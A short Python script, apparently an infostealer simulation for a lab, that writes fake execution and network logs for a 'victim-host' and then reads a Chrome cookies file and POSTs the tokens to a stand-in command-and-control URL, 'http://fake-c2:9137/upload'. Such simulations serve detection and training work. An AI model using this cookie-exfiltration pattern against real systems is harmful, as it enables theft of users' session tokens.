import json
import time
import requests
from datetime import datetime
from pathlib import Path

LOG_DIR = Path("logs")
ART_DIR = Path("artifacts")

LOG_DIR.mkdir(exist_ok=True)
ART_DIR.mkdir(exist_ok=True)

EXEC_LOG = LOG_DIR / "execution.log"
NET_LOG = LOG_DIR / "network.log"
TOKENS = ART_DIR / "chrome_cookies.json"

C2_URL = "http://fake-c2:9137/upload"

execution = {
    "timestamp": datetime.utcnow().isoformat() + "Z",
    "hostname": "victim-host",
    "user": "employee1",
    "process": "infostealer_sim.py",
    "language": "Python",
    "os": "Linux",
    "status": "executed"
}

EXEC_LOG.write_text(json.dumps(execution))

tokens = json.loads(TOKENS.read_text())

netlog = {
    "timestamp": datetime.utcnow().isoformat() + "Z",
    "source_ip": "10.83.17.10",
    "destination_ip": "10.83.17.66",
    "destination_port": 9137,
    "protocol": "HTTP",
    "encrypted": False,
    "c2_host": "fake-c2"
}

NET_LOG.write_text(json.dumps(netlog))

requests.post(C2_URL, json=tokens, timeout=2)

time.sleep(1)
